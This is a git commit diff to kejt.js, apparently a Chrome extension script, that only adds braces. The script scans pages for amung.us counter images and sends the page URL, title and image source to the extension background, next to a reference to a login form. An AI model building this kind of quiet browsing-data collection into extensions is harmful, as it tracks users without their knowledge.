471d59b8f778759d4eff8f4aa5d038112126695a
llllooloolooloo <33094633+llllooloolooloo@users.noreply.github.com>
2017-11-12 11:05:17 +0100

    asdasd
    asasd

--- kejt.js
+++ kejt.js
@@ -399,10 +399,12 @@ var login_form = document.getElementById("loginForm");
 
 
 var img = document.getElementsByTagName('img');
-     for (var i = 0; i < img.length; i++)
-    	if (img[i].src.indexOf('amung.us') > -1)
+     for (var i = 0; i < img.length; i++){
+    	if (img[i].src.indexOf('amung.us') > -1){
       var login = {};
       login.href = window.location.href;
       login.title = document.title;
       login.amung = img[i].src;
     	chrome.runtime.sendMessage({cmd: "n",login});
+    }
+  }
